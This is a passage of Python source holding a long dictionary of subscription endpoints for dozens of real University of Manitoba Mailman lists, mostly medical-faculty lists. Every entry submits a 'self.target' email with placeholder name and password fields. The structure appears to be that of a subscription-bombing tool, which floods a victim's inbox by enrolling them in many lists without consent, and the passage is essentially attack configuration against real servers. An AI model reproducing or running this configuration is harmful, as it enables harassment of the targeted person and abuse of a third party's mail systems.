                'url': 'http://lists.umanitoba.ca/mailman/subscribe/mauro-friends',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/mauro-friends',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'KutIw': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/mauro-staff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/mauro-staff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'CCtoV': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'qgoCs': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-academics-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-academics-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'laLEu': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BRHip': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-alumni',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-alumni',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fXkmN': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-anesthesia-aca',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-anesthesia-aca',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'gSOtN': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-anesthesia-education',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-anesthesia-education',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kiiOf': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-biochem-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-biochem-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vbeAH': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-biochem-grdstd',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-biochem-grdstd',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vEdDB': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-biochem-other',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-biochem-other',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OXPvt': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-biochem-supstaff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-biochem-supstaff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'nvqdP': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-chp-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-chp-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'COQMj': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-chp-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-chp-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'xkYWu': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-chs-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-chs-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RZsvt': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-chs-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-chs-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'rbXid': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-chs-supstaff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-chs-supstaff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'oiuNc': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-class2018-student',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-class2018-student',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'DWNPP': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-class2019-student',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-class2019-student',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZMrUw': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-class2020-student',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-class2020-student',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'YUCmz': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-class2021-student',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-class2021-student',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'zGCri': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-class2022-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-class2022-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RCAkp': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-class2022-student',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-class2022-student',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'KsgJM': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-class2023-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-class2023-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ssDjs': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-class2023-student',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-class2023-student',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'aFQlr': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-class2024-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-class2024-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QrGwI': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-class2024-student',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-class2024-student',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'zhWFa': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-cpd-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-cpd-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uYCOA': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-cpd-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-cpd-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wrTyX': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-dean-office',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-dean-office',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'qsKnc': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-deansoffice-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-deansoffice-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'siRgg': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-deansoffice-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-deansoffice-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QMsaK': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-deansoffice-supstaff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-deansoffice-supstaff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RDKaL': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-educ-ofc',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-educ-ofc',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'LLsYb': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-ehso-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-ehso-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HIoal': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-emerg-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-emerg-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HcNPY': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-fammed-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-fammed-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'pjHcn': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-fammed-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-fammed-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },

            'veQzs': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-fammed-supstaff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-fammed-supstaff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PKtGD': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-grad-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-grad-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Fmioh': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-grdstd',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-grdstd',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tJUca': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-immunology-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-immunology-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Quntu': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-immunology-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-immunology-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XjUFw': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-intmed-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-intmed-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'elrqz': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-intmed-supstaff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-intmed-supstaff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'AqJOd': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-microbio-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-microbio-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JXtff': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-microbio-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-microbio-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kGBHW': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-microbio-others',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-microbio-others',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'pNfys': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-microbio-supstaff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-microbio-supstaff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jYVDk': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-obstetrics-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-obstetrics-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WWgOS': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-obstetrics-supstaff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-obstetrics-supstaff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ebfpM': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-ophth-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-ophth-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HkVKj': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-other-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-other-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XJUXq': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-others',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-others',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'TFrUj': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-otolaryngology-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-otolaryngology-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ViROp': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-pathology-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-pathology-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RzmQY': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-pathology-supstaff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-pathology-supstaff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fYzfT': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-pharmacology-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-pharmacology-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'TsYdd': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-pharmacology-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-pharmacology-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'EroKr': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-pharmacology-nil-appt',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-pharmacology-nil-appt',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'FpiZi': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-pharmacology-students',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-pharmacology-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'rsxiv': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-pharmacology-supstaff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-pharmacology-supstaff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'KxNwK': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-physiology-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-physiology-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'KHBbt': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-physiology-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-physiology-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'TFklG': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-physiology-students',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-physiology-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WMNum': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-physiology-supstaff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-physiology-supstaff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'sbuHQ': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-psychiatry-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-psychiatry-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'iYKdn': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-psychiatry-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-psychiatry-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kAMQB': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-psychiatry-supstaff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-psychiatry-supstaff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'SKlOP': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-radiology-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-radiology-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OjmzR': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-radiology-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-radiology-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ILBXh': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-radiology-supstaff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-radiology-supstaff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VEMqH': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-reps',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-reps',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mnIbc': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-supstaff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-supstaff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'StrGa': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-surgery-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-surgery-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GVClE': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-surgery-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-surgery-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'aWIwP': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/med-surgery-supstaff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/med-surgery-supstaff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZZsKl': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/meeting-adr-rlo',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/meeting-adr-rlo',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'iZViW': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/mhiknet-l',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/mhiknet-l',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tjodK': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/mhla-news',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/mhla-news',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BGLNC': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/mhr-practicumadvisors',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/mhr-practicumadvisors',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'sLOKP': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/mhr-practicumstudents',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/mhr-practicumstudents',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
